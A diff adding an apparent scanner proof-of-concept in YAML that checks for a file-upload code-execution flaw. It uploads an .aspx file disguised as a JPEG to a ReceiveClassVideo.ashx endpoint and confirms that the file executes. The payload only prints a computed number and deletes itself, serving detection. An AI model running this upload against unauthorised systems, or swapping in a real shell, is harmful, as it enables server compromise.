@@ -1,0 +1,32 @@
+name: poc-yaml-file-upload-rce
+transport: http
+set:
+  rfilename: randomLowercase(4)
+  s1: randomInt(40000, 44800)
+  s2: randomInt(40000, 44800)
+  rboundary: randomLowercase(8)
+rules:
+  r1:
+    request:
+      method: POST
+      path: /Tool/ReceiveClassVideo.ashx?file_tmid={{rfilename}}&orgid=1&classID=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: |-
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="File1"; filename="{{rfilename}}.aspx"
+        Content-Type: image/jpeg
+
+        <%@Page Language="C#"%>
+        <%Response.Write({{s1}}*{{s2}});System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: response.status == 200
+  r2:
+    request:
+      method: GET
+      path: /Upload/AD_Info/1/{{rfilename}}.aspx
+    expression: response.status == 200 && response.body_string.contains(string(s1 * s2))
+expression: r1() && r2()
+detail:
+  author: k3ppf0r
+  links: []
